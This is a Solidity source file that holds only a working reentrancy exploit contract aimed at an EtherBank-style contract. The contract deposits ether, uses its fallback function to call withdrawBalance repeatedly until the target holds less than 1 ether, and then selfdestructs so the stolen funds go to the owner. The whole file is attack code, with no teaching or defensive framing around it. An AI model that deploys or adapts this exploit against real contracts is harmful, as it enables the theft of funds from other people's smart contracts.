pragma solidity ^0.4.0;

interface IEtherBank {
    function addToBalance() external payable;
    function withdrawBalance() external;
}

contract ReentrancyExploit {
    IEtherBank public target;
    address owner;

    constructor(address _target) public {
        target = IEtherBank(_target);
        owner = msg.sender;
    }

    // Deposit minimal amount to initialize balance
    function deposit() public payable {
        require(msg.value >= 1 ether);
        target.addToBalance.value(msg.value)();
    }

    // Begin the attack
    function attack() public {
        target.withdrawBalance();
    }

    // This fallback is triggered during the reentrant call
    function() public payable {
        if (target.balance >= 1 ether) {
            target.withdrawBalance();
        }
    }

    function collect() public {
        require(msg.sender == owner);
        selfdestruct(owner);
    }
}

